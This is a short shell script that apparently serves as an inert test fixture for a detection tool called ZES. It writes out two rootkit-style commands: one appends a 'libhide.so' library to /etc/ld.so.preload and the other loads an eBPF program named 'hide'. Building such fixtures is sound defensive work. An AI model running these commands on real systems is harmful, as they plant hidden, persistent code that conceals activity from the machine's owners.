#!/bin/sh
# ZES test fixture (inert, never executed)
echo /usr/lib/libhide.so >> /etc/ld.so.preload
bpftool prog load ./hide.o /sys/fs/bpf/hide
